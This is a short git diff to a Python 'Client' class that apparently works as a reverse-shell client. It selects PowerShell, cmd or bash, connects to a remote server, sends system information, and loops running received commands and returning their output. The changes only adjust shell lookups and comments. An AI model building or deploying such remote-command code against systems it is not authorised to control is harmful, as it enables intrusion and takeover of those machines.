@@ -23,9 +23,9 @@ class Client(StreamSocket):
         environment = os.environ.copy()
 
         if op_sys == "nt":
-            shell_exec = shutil.which("powershell.exe")
+            shell_exec = shutil.which("powershell")
             if shell_exec is None:
-                shell_exec = shutil.which("cmd.exe")
+                shell_exec = shutil.which("cmd")
         else:
             shell_exec = shutil.which("bash")
             if shell_exec is None:
@@ -64,13 +64,15 @@ class Client(StreamSocket):
             utils.throw(f"Could not establish connection with {self.Address}")
 
         try:
+            # receive => established message
             establish_msg = self.receive(sock).decode()
             utils.status(establish_msg)
 
+            # send => system information
             sysinfo = self.sys_info()
             self.send(sock, sysinfo)
 
-            # TODO: fix issue => exception is thrown when running outside of pycharm
+            # TODO: add code to send working directory to server each iteration
 
             while True:
                 command = self.receive(sock).decode()
@@ -89,6 +91,7 @@ class Client(StreamSocket):
                         utils.status(bytes(output).decode(), level, command)
                     elif self.Verbose:
                         utils.status(f"stdin => [{command}]", level)
+                        #print(opts["color"] + opts["symbol"] + Style.RESET_ALL, end=" ")
 
                     self.send(sock, output)
                 else:
